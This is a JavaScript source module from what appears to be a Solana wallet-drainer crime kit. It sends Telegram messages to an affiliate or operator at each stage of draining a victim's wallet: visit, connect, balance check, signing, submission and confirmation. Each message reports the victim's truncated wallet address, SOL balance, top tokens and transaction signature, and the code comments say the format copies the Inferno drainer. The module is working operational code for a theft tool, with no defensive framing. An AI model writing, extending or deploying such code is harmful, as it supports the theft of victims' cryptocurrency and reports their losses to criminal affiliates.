'use strict';
/**
 * Real-time Telegram affiliate notifications — Enhancement from MERGED_KIT.md.
 *
 * MERGED_KIT finding (from Inferno comparison):
 *   "Real-time Telegram bot: per-step notification to affiliate's Telegram.
 *   Steps: visit → connect → balance → sign → submit → confirmed.
 *   Each step shows victim wallet (truncated), SOL balance, token list."
 *
 * Inferno's model (from inferno_configs/config-user.json + MERGED_KIT analysis):
 *   Each drain step fires: "❓ Customer id: X ⚙ Process: Y 🔔 Method: Z ➡ Step: sent"
 *   The affiliate receives every step in real-time in their Telegram chat.
 *
 * The hexfomo kit already has tgid/tgus attribution threading (page/telegram.js)
 * and the /api/handler telemetry channel. This module adds the AFFILIATE-SIDE
 * Telegram notification — the bot message the operator/affiliate receives
 * when a victim hits each stage.
 *
 * Sources:
 *   - archive/external_samples/solana_phantom/Solana_Phantom_Drainer/wallet.js
 *     (the previous-gen: simple sendMessage per connect)
 *   - Inferno config: "log_prompts", "log_chains_accepts" options
 *   - MERGED_KIT.md: Inferno notification model, affiliate dashboard
 */

const TELEGRAM_API = 'https://api.telegram.org/bot';

// Step labels matching Inferno's format (adapted for Solana)
const STEP = {
  VISIT:    'visit',
  CONNECT:  'connect',
  BALANCE:  'balance_ok',
  SIGN:     'signed',
  SUBMIT:   'submitted',
  CONFIRMED:'confirmed',
  FAILED:   'failed',
};

/**
 * buildNotifyMessage(step, context):
 *   Builds a Telegram message matching Inferno's affiliate notification format.
 *
 *   context: {
 *     customerId: string,       // affiliate ID (from /api/config or bundle)
 *     wallet: string,           // victim wallet (truncated 8 chars)
 *     solBalance: number,       // SOL balance
 *     tokens: [{symbol, usd}],  // top tokens
 *     totalUsd: number,         // total portfolio USD
 *     txSig: string|null,       // transaction signature if known
 *     error: string|null,       // error message if failed
 *   }
 */
function buildNotifyMessage(step, ctx) {
  const walletShort = ctx.wallet ? ctx.wallet.slice(0, 8) + '...' : '?';
  const solStr      = ctx.solBalance ? ctx.solBalance.toFixed(3) + ' SOL' : '?';
  const topTokens   = (ctx.tokens || []).slice(0, 3)
    .map(t => t.symbol + ' $' + (t.usd || 0).toFixed(0))
    .join(' | ') || 'none';

  const lines = [
    `❓ <b>Customer</b>: <code>${ctx.customerId || 'unknown'}</code>`,
    `⚙ <b>Step</b>: ${step}`,
    `👛 <b>Wallet</b>: <code>${walletShort}</code>`,
    `💰 <b>Balance</b>: ${solStr}`,
    `🪙 <b>Tokens</b>: ${topTokens}`,
  ];

  if (ctx.totalUsd) lines.push(`💵 <b>Total</b>: $${ctx.totalUsd.toFixed(0)}`);
  if (ctx.txSig)    lines.push(`🔗 <b>Tx</b>: <code>${ctx.txSig.slice(0, 16)}...</code>`);
  if (ctx.error)    lines.push(`❌ <b>Error</b>: ${ctx.error.slice(0, 100)}`);

  return lines.join('\n');
}

/**
 * sendTelegramNotify(botToken, chatId, text):
 *   Fire-and-forget Telegram sendMessage.
 *   Uses HTML parse mode (same as Inferno's format).
 */
async function sendTelegramNotify(botToken, chatId, text) {
  if (!botToken || !chatId) return;
  try {
    await fetch(`${TELEGRAM_API}${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id:    chatId,
        text,
        parse_mode: 'HTML',
      }),
      signal: AbortSignal.timeout ? AbortSignal.timeout(5000)
            : (() => { const c = new AbortController(); setTimeout(() => c.abort(), 5000); return c.signal; })(),
    });
  } catch { /* fire-and-forget */ }
}

/**
 * notifyAffiliate(step, context, config):
 *   Top-level notification — reads bot token and chat ID from config overrides
 *   (passed via ?o= URL param or /api/config Ne field), then fires.
 *
 *   config.Ne.tgBot  = Telegram bot token (affiliate-specific)
 *   config.Ne.tgChat = Telegram chat ID (affiliate-specific)
 */
async function notifyAffiliate(step, ctx, config) {
  const botToken = config?.Ne?.tgBot || config?.tgBot;
  const chatId   = config?.Ne?.tgChat || config?.tgChat;
  if (!botToken || !chatId) return;
  const msg = buildNotifyMessage(step, ctx);
  await sendTelegramNotify(botToken, chatId, msg);
}

module.exports = { STEP, buildNotifyMessage, sendTelegramNotify, notifyAffiliate };
